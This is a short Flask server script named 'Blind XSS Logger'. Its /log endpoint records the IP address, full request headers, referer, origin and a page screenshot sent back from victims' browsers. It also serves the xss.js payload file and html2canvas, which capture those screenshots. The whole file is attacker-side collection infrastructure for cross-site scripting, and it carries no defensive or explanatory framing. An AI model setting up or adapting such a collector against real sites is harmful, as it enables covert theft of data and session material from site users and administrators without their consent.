from flask import Flask, request, jsonify, send_from_directory
import datetime

app = Flask(__name__, static_url_path='/static')

# Store logs in memory or to a file
logs = []

@app.route('/')
def home():
    return "Blind XSS Logger Active"

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    log_entry = {
        'time': str(datetime.datetime.now()),
        'ip': request.remote_addr,
        'headers': dict(request.headers),
        'screenshot': data.get('screenshot'),
        'user_agent': request.headers.get('User-Agent'),
        'referer': request.headers.get('Referer'),
        'origin': request.headers.get('Origin')
    }
    logs.append(log_entry)
    print(f"New log: {log_entry}")
    return jsonify({"status": "ok"}), 200

# Directly serve xss.js at /xss.js
@app.route('/xss.js')
def serve_xss():
    return send_from_directory('static', 'xss.js')

# Optional: to serve html2canvas as well
@app.route('/html2canvas.min.js')
def serve_html2canvas():
    return send_from_directory('static', 'html2canvas.min.js')

if __name__ == '__main__':
    app.run(debug=True)
